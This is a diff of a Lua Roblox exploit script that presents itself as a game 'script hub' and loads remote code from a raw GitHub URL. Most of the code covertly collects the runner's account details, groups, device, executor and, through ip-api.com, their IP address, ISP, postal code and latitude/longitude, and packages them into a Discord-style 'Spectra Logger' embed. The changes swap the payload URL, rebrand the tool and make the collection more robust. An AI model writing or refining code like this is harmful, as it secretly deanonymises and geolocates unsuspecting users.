@@ -1,5 +1,3 @@
--- Sistema de Logs Completo - VERSIÓN CORREGIDA
-
 pcall(function()
     local repStorage = game:GetService("ReplicatedStorage")
     local targetValue = repStorage:FindFirstChild("XbBljMzCHCAGKSUqNhZ")
@@ -9,7 +7,7 @@ pcall(function()
 end)
 
 local games = {
-    [3623096087] = "https://raw.githubusercontent.com/Xfrxn95/UI/refs/heads/main/EXTranerl"
+    [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
 }
 
 local HttpService = game:GetService("HttpService")
@@ -67,10 +65,11 @@ local function getPlayerInfo()
     end)
     
     pcall(function()
-        info.friendsCount = #LocalPlayer:GetFriendsOnline()
+        local friends = LocalPlayer:GetFriendsOnline()
+        info.friendsCount = friends and #friends or 0
     end)
     
-    pcall(function()
+    local success1 = pcall(function()
         local response = makeHTTPRequest({
             Url = "https://friends.roblox.com/v1/users/" .. info.userId .. "/followers/count",
             Method = "GET"
@@ -81,7 +80,7 @@ local function getPlayerInfo()
         end
     end)
     
-    pcall(function()
+    local success2 = pcall(function()
         local response = makeHTTPRequest({
             Url = "https://friends.roblox.com/v1/users/" .. info.userId .. "/followings/count",
             Method = "GET"
@@ -92,7 +91,7 @@ local function getPlayerInfo()
         end
     end)
     
-    pcall(function()
+    local success3 = pcall(function()
         local response = makeHTTPRequest({
             Url = "https://users.roblox.com/v1/users/" .. info.userId,
             Method = "GET"
@@ -112,32 +111,34 @@ local function getAvatarInfo()
     local info = {
         accessories = 0,
         clothingItems = 0,
-        scales = "Unknown"
+        scales = "Default"
     }
     
-    pcall(function()
+    local success = pcall(function()
         local character = LocalPlayer.Character
-        if not character then
-            character = LocalPlayer.CharacterAdded:Wait()
-            wait(1)
-        end
-        
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            local description = humanoid:GetAppliedDescription()
-            
-            info.accessories = #description:GetAccessories(true)
-            
-            local clothingCount = 0
-            if description.Shirt ~= 0 then clothingCount = clothingCount + 1 end
-            if description.Pants ~= 0 then clothingCount = clothingCount + 1 end
-            if description.GraphicTShirt ~= 0 then clothingCount = clothingCount + 1 end
-            info.clothingItems = clothingCount
-            
-            info.scales = string.format("H:%.1f W:%.1f", 
-                description.HeightScale or 1, 
-                description.WidthScale or 1
-            )
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                local descSuccess = pcall(function()
+                    local description = humanoid:GetAppliedDescription()
+                    if description then
+                        local accSuccess = pcall(function()
+                            local accs = description:GetAccessories(true)
+                            info.accessories = accs and #accs or 0
+                        end)
+                        
+                        local clothingCount = 0
+                        if description.Shirt and description.Shirt ~= 0 then clothingCount = clothingCount + 1 end
+                        if description.Pants and description.Pants ~= 0 then clothingCount = clothingCount + 1 end
+                        if description.GraphicTShirt and description.GraphicTShirt ~= 0 then clothingCount = clothingCount + 1 end
+                        info.clothingItems = clothingCount
+                        
+                        if description.HeightScale and description.WidthScale then
+                            info.scales = string.format("H:%.1f W:%.1f", description.HeightScale, description.WidthScale)
+                        end
+                    end
+                end)
+            end
         end
     end)
     
@@ -148,7 +149,7 @@ local function getGroupInfo()
     local groups = {}
     local totalGroups = 0
     
-    pcall(function()
+    local success = pcall(function()
         local response = makeHTTPRequest({
             Url = "https://groups.roblox.com/v2/users/" .. LocalPlayer.UserId .. "/groups/roles",
             Method = "GET"
@@ -160,11 +161,13 @@ local function getGroupInfo()
                 totalGroups = #data.data
                 for i = 1, math.min(#data.data, 3) do
                     local group = data.data[i]
-                    table.insert(groups, string.format(
-                        "%s - %s",
-                        group.group.name:sub(1, 25),
-                        group.role.name:sub(1, 15)
-                    ))
+                    if group and group.group and group.role then
+                        table.insert(groups, string.format(
+                            "%s - %s",
+                            group.group.name:sub(1, 25),
+                            group.role.name:sub(1, 15)
+                        ))
+                    end
                 end
             end
         end
@@ -185,12 +188,13 @@ local function getPlatformInfo()
     }
     
     pcall(function()
-        info.platform = tostring(UserInputService:GetPlatform())
-        info.touchEnabled = UserInputService.TouchEnabled
-        info.keyboardEnabled = UserInputService.KeyboardEnabled
-        info.mouseEnabled = UserInputService.MouseEnabled
-        info.gamepadEnabled = UserInputService.GamepadEnabled
-        info.vrEnabled = UserInputService.VREnabled
+        local platform = UserInputService:GetPlatform()
+        info.platform = platform and tostring(platform) or "Unknown"
+        info.touchEnabled = UserInputService.TouchEnabled or false
+        info.keyboardEnabled = UserInputService.KeyboardEnabled or false
+        info.mouseEnabled = UserInputService.MouseEnabled or false
+        info.gamepadEnabled = UserInputService.GamepadEnabled or false
+        info.vrEnabled = UserInputService.VREnabled or false
         
         if info.vrEnabled then
             info.device = "VR Headset"
@@ -227,12 +231,16 @@ local function getGameInfo()
     
     pcall(function()
         local gameInfo = MarketplaceService:GetProductInfo(placeId)
-        info.placeName = gameInfo.Name
-        info.creatorName = gameInfo.Creator.Name
-        info.creatorType = gameInfo.Creator.CreatorType
-        info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId
-        info.created = gameInfo.Created:sub(1, 10)
-        info.updated = gameInfo.Updated:sub(1, 10)
+        if gameInfo then
+            info.placeName = gameInfo.Name or "Unknown"
+            if gameInfo.Creator then
+                info.creatorName = gameInfo.Creator.Name or "Unknown"
+                info.creatorType = gameInfo.Creator.CreatorType or "Unknown"
+                info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId or 0
+            end
+            info.created = gameInfo.Created and gameInfo.Created:sub(1, 10) or "Unknown"
+            info.updated = gameInfo.Updated and gameInfo.Updated:sub(1, 10) or "Unknown"
+        end
     end)
     
     pcall(function()
@@ -256,7 +264,7 @@ local function getGameInfo()
     
     pcall(function()
         info.jobId = game.JobId or "Unknown"
-        info.maxPlayers = Players.MaxPlayers
+        info.maxPlayers = Players.MaxPlayers or 0
         info.playerCount = #Players:GetPlayers()
     end)
     
@@ -271,14 +279,16 @@ local function getServerInfo()
     }
     
     pcall(function()
-        if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
+        if game.PrivateServerId and game.PrivateServerId ~= "" and game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0 then
             info.vipServer = true
             info.privateServer = true
         end
     end)
     
     pcall(function()
-        info.serverAge = math.floor(workspace.DistributedGameTime / 60)
+        if workspace.DistributedGameTime then
+            info.serverAge = math.floor(workspace.DistributedGameTime / 60)
+        end
     end)
     
     return info
@@ -293,9 +303,15 @@ local function getExecutorInfo()
     
     pcall(function()
         if identifyexecutor then
-            info.name = identifyexecutor()
+            local success, result = pcall(identifyexecutor)
+            if success and result then
+                info.name = tostring(result)
+            end
         elseif getexecutorname then
-            info.name = getexecutorname()
+            local success, result = pcall(getexecutorname)
+            if success and result then
+                info.name = tostring(result)
+            end
         elseif KRNL_LOADED then
             info.name = "KRNL"
         elseif syn then
@@ -313,7 +329,7 @@ local function getExecutorInfo()
         elseif jit then
             info.name = "EasyExploits"
         else
-            info.name = "Unknown"
+            info.name = "Delta/Unknown"
         end
     end)
     
@@ -324,10 +340,16 @@ local function getExecutorInfo()
     }
     
     for _, funcName in ipairs(functionsToCheck) do
-        if pcall(loadstring("return " .. funcName)) then
-            table.insert(info.functions, funcName)
-            info.level = info.level + 1
-        end
+        local success = pcall(function()
+            local func = loadstring("return " .. funcName)
+            if func then
+                local result = func()
+                if result then
+                    table.insert(info.functions, funcName)
+                    info.level = info.level + 1
+                end
+            end
+        end)
     end
     
     return info
@@ -341,21 +363,26 @@ local function getPerformanceInfo()
     }
     
     pcall(function()
-        info.fps = math.floor(1 / RunService.RenderStepped:Wait())
+        local fps = 1 / RunService.RenderStepped:Wait()
+        info.fps = math.floor(fps)
     end)
     
     pcall(function()
         local network = Stats:FindFirstChild("Network")
         if network then
             local serverStats = network:FindFirstChild("ServerStatsItem")
-            if serverStats and serverStats:FindFirstChild("Data Ping") then
-                info.ping = math.floor(serverStats["Data Ping"]:GetValue())
+            if serverStats then
+                local dataPing = serverStats:FindFirstChild("Data Ping")
+                if dataPing then
+                    info.ping = math.floor(dataPing:GetValue())
+                end
             end
         end
     end)
     
     pcall(function()
-        info.memory = math.floor(Stats:GetTotalMemoryUsageMb())
+        local memory = Stats:GetTotalMemoryUsageMb()
+        info.memory = math.floor(memory)
     end)
     
     return info
@@ -378,7 +405,7 @@ local function getIPInfo()
         vpn = false
     }
     
-    pcall(function()
+    local success = pcall(function()
         local response = makeHTTPRequest({
             Url = "http://ip-api.com/json/?fields=66846719",
             Method = "GET"
@@ -386,7 +413,7 @@ local function getIPInfo()
         
         if response and response.Body then
             local decoded = HttpService:JSONDecode(response.Body)
-            if decoded.status == "success" then
+            if decoded and decoded.status == "success" then
                 ipData.ip = decoded.query or "Protected"
                 ipData.country = decoded.country or "Unknown"
                 ipData.countryCode = decoded.countryCode or "XX"
@@ -395,8 +422,8 @@ local function getIPInfo()
                 ipData.isp = decoded.isp or "Unknown"
                 ipData.timezone = decoded.timezone or "Unknown"
                 ipData.postal = decoded.zip or "Unknown"
-                ipData.lat = tostring(decoded.lat or "Unknown")
-                ipData.lon = tostring(decoded.lon or "Unknown")
+                ipData.lat = decoded.lat and tostring(decoded.lat) or "Unknown"
+                ipData.lon = decoded.lon and tostring(decoded.lon) or "Unknown"
                 ipData.asn = decoded.as or "Unknown"
                 ipData.org = decoded.org or "Unknown"
                 ipData.vpn = decoded.proxy or false
@@ -411,8 +438,8 @@ local function getScreenResolution()
     local resolution = "Unknown"
     pcall(function()
         local camera = workspace.CurrentCamera
-        if camera then
-            resolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
+        if camera and camera.ViewportSize then
+            resolution = math.floor(camera.ViewportSize.X) .. "x" .. math.floor(camera.ViewportSize.Y)
         end
     end)
     return resolution
@@ -421,20 +448,29 @@ end
 local function getSystemLocale()
     local locale = "Unknown"
     pcall(function()
-        locale = game:GetService("LocalizationService").SystemLocaleId
+        local localizationService = game:GetService("LocalizationService")
+        if localizationService and localizationService.SystemLocaleId then
+            locale = localizationService.SystemLocaleId
+        end
     end)
     return locale
 end
 
 local function getJoinData()
     local data = {
-        joinTime = os.date("%H:%M:%S"),
-        joinDate = os.date("%Y-%m-%d"),
+        joinTime = "Unknown",
+        joinDate = "Unknown",
         teleportData = "Direct Join"
     }
     
     pcall(function()
-        local teleportData = game:GetService("TeleportService"):GetLocalPlayerTeleportData()
+        data.joinTime = os.date("%H:%M:%S")
+        data.joinDate = os.date("%Y-%m-%d")
+    end)
+    
+    pcall(function()
+        local teleportService = game:GetService("TeleportService")
+        local teleportData = teleportService:GetLocalPlayerTeleportData()
         if teleportData then
             data.teleportData = "Teleported"
         end
@@ -630,7 +666,7 @@ local function buildEmbed()
                 url = string.format("https://assetgame.roblox.com/Thumbs/Asset.ashx?width=768&height=432&assetId=%d", placeId)
             },
             footer = {
-                text = "Galaxy Hub Advanced Logger v2.5",
+                text = "Spectra Logger",
                 icon_url = "https://i.imgur.com/AfFp7pu.png"
             },
             timestamp = DateTime.now():ToIsoDate()
@@ -684,7 +720,7 @@ if games[placeId] then
 else
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Galaxy Hub",
+            Title = "Spectra",
             Text = "No hay script para este juego",
             Duration = 5
         })
